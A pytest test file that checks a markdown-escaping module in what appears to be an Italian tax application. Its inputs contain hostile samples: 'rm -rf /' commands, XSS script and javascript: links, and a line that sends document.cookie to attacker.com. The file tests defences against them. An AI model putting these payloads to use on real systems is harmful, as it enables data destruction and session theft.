"""Test suite for markdown_escaper.py security module.

TDD-first tests for escaping markdown special characters
to prevent markdown injection attacks in generated task files.
"""

import pytest

from app.utils.security.markdown_escaper import (
    escape_markdown,
    escape_markdown_code_block,
    sanitize_for_markdown_file,
)


class TestEscapeMarkdown:
    """Tests for escape_markdown function."""

    def test_escape_markdown_asterisks(self):
        """Test that asterisks are escaped to prevent bold/italic formatting."""
        input_text = "This is *bold* and **double bold**"
        result = escape_markdown(input_text)
        assert "\\*" in result
        assert "*bold*" not in result

    def test_escape_markdown_underscores(self):
        """Test that underscores are escaped to prevent italic/bold formatting."""
        input_text = "This is _italic_ and __underlined__"
        result = escape_markdown(input_text)
        assert "\\_" in result
        assert "_italic_" not in result

    def test_escape_markdown_backticks(self):
        """Test that backticks are escaped to prevent code injection."""
        input_text = "Run `rm -rf /` command"
        result = escape_markdown(input_text)
        assert "\\`" in result
        assert "`rm -rf /`" not in result

    def test_escape_markdown_hash(self):
        """Test that hash symbols are escaped to prevent heading injection."""
        input_text = "# This is a heading\n## Subheading"
        result = escape_markdown(input_text)
        assert "\\#" in result
        # The escaped version should start with \# not bare #
        assert result.startswith("\\#")

    def test_escape_markdown_brackets(self):
        """Test that brackets are escaped to prevent link injection."""
        input_text = "[Click here](http://malicious.com)"
        result = escape_markdown(input_text)
        assert "\\[" in result
        assert "\\]" in result
        assert "[Click here]" not in result

    def test_escape_markdown_pipes(self):
        """Test that pipes are escaped to prevent table injection."""
        input_text = "| Column1 | Column2 |"
        result = escape_markdown(input_text)
        assert "\\|" in result
        assert "| Column1 |" not in result

    def test_escape_markdown_angle_brackets(self):
        """Test that angle brackets are escaped to prevent HTML injection."""
        input_text = "<script>alert('xss')</script>"
        result = escape_markdown(input_text)
        assert "\\<" in result or "&lt;" in result
        assert "<script>" not in result

    def test_escape_markdown_exclamation(self):
        """Test that exclamation + brackets are escaped to prevent image injection."""
        input_text = "![Malicious](http://evil.com/tracker.gif)"
        result = escape_markdown(input_text)
        assert "\\!" in result or "\\[" in result
        assert "![Malicious]" not in result

    def test_escape_markdown_preserves_unicode(self):
        """Test that Unicode characters are preserved correctly."""
        input_text = "Calcolo IVA: 22% su fattura elettronica"
        result = escape_markdown(input_text)
        assert "Calcolo IVA" in result
        assert "22%" in result
        assert "fattura elettronica" in result

    def test_escape_markdown_preserves_italian_special_chars(self):
        """Test that Italian special characters are preserved."""
        input_text = "Perch\u00e8 l'imposta \u00e8 dovuta?"
        result = escape_markdown(input_text)
        assert "\u00e8" in result
        assert "l'" in result

    def test_escape_markdown_empty_string(self):
        """Test handling of empty string."""
        assert escape_markdown("") == ""

    def test_escape_markdown_only_special_chars(self):
        """Test string with only special characters."""
        input_text = "*_`#[]|<>!"
        result = escape_markdown(input_text)
        # All special chars should be escaped
        assert "*" not in result.replace("\\*", "")
        assert "_" not in result.replace("\\_", "")

    def test_escape_markdown_newlines_preserved(self):
        """Test that newlines are preserved."""
        input_text = "Line 1\nLine 2\nLine 3"
        result = escape_markdown(input_text)
        assert "\n" in result
        assert result.count("\n") == 2

    def test_escape_markdown_multiple_occurrences(self):
        """Test that all occurrences are escaped, not just first."""
        input_text = "**bold** and **more bold** and **even more**"
        result = escape_markdown(input_text)
        # All asterisks should be escaped
        assert result.count("\\*") >= 6  # At least 6 asterisks to escape


class TestEscapeMarkdownCodeBlock:
    """Tests for escape_markdown_code_block function."""

    def test_escape_code_block_triple_backticks(self):
        """Test that triple backticks inside content are escaped."""
        input_text = "```python\nprint('hello')\n```"
        result = escape_markdown_code_block(input_text)
        # Should not have unescaped triple backticks
        assert "```" not in result or result.count("```") == 0

    def test_escape_code_block_preserves_content(self):
        """Test that code content is preserved."""
        input_text = "def calculate_iva(amount):\n    return amount * 0.22"
        result = escape_markdown_code_block(input_text)
        assert "calculate_iva" in result
        assert "0.22" in result


class TestSanitizeForMarkdownFile:
    """Tests for sanitize_for_markdown_file function."""

    def test_sanitize_task_name_injection(self):
        """Test sanitization of task names that could contain injection."""
        # Attacker tries to inject markdown into task name
        malicious_task_name = "### INJECTED HEADING\n\n[Malicious Link](http://evil.com)"
        result = sanitize_for_markdown_file(malicious_task_name)
        # Should not render as heading or link
        assert "### INJECTED" not in result
        assert "[Malicious Link](" not in result

    def test_sanitize_user_content(self):
        """Test sanitization of user-provided content."""
        user_content = """
        The answer is **incorrect** because:
        - Point 1: Check [this link](http://example.com)
        - Point 2: Run `sudo rm -rf /`
        """
        result = sanitize_for_markdown_file(user_content)
        # Markdown formatting should be escaped
        assert "**incorrect**" not in result
        assert "`sudo rm -rf /`" not in result
        assert "[this link](" not in result

    def test_sanitize_preserves_plain_text(self):
        """Test that plain text without special chars is unchanged."""
        plain_text = "This is plain text without any special characters"
        result = sanitize_for_markdown_file(plain_text)
        assert "This is plain text" in result

    def test_sanitize_handles_none_gracefully(self):
        """Test that None input returns empty string or raises appropriately."""
        # Depending on design choice - either return "" or raise TypeError
        with pytest.raises((TypeError, ValueError)):
            sanitize_for_markdown_file(None)

    def test_sanitize_expert_feedback_scenario(self):
        """Test real-world scenario: expert feedback with markdown injection attempt."""
        # Simulate attacker submitting malicious feedback
        malicious_feedback = """
La risposta fornita \u00e8 incompleta. Manca la trattazione di:

## INJECTED SECTION

```javascript
document.location = 'http://attacker.com/steal?cookie=' + document.cookie
```

Riferimenti: [Agenzia delle Entrate](javascript:alert('xss'))
"""
        result = sanitize_for_markdown_file(malicious_feedback)

        # Check that dangerous content is neutralized
        assert "## INJECTED" not in result
        assert "```javascript" not in result
        assert "javascript:alert" not in result or "\\[" in result

    def test_sanitize_strips_null_bytes(self):
        """Test that null bytes are stripped."""
        input_with_null = "Safe text\x00Malicious payload"
        result = sanitize_for_markdown_file(input_with_null)
        assert "\x00" not in result

    def test_sanitize_max_length_enforcement(self):
        """Test that very long content is handled appropriately."""
        # Task description should have reasonable limits
        very_long_text = "A" * 10000
        result = sanitize_for_markdown_file(very_long_text, max_length=5000)
        assert len(result) <= 5000


class TestSecurityBoundaries:
    """Security boundary tests for markdown escaping."""

    def test_double_escape_prevention(self):
        """Test that already escaped content is not double-escaped."""
        # If content already has backslash escapes, don't double-escape
        pre_escaped = "Already escaped \\*text\\*"
        result = escape_markdown(pre_escaped)
        # Should not have \\\\*
        assert "\\\\*" not in result

    def test_mixed_safe_and_unsafe_content(self):
        """Test handling of mixed content."""
        mixed = "Safe Italian text: Articolo 1, comma 54-89. *Unsafe* markdown."
        result = escape_markdown(mixed)
        # Safe parts preserved (with some chars escaped like - and .)
        assert "Articolo 1, comma 54" in result
        assert "Safe Italian text" in result
        # Unsafe parts escaped (asterisks should be prefixed with backslash)
        assert "\\*Unsafe\\*" in result
        # Verify no unescaped asterisks (asterisks not preceded by backslash)
        import re

        unescaped_asterisks = re.findall(r"(?<!\\)\*", result)
        assert len(unescaped_asterisks) == 0, f"Found unescaped asterisks: {unescaped_asterisks}"

    def test_recursive_injection_attempt(self):
        """Test defense against recursive injection attempts."""
        # Attacker tries to use escape sequences to bypass escaping
        recursive = "\\*still bold*"
        result = escape_markdown(recursive)
        # Should escape the asterisk, not render as bold
        assert "*still bold*" not in result or "\\*" in result

    def test_multiline_markdown_injection(self):
        """Test protection against multiline markdown injection."""
        multiline_injection = """Normal text

---

## Injected Heading

| Injected | Table |
|----------|-------|
| Data | Data |
"""
        result = sanitize_for_markdown_file(multiline_injection)
        # Should not have horizontal rule, heading, or table
        assert "---\n" not in result or "\\-" in result
        assert "## Injected" not in result
        assert "| Injected |" not in result
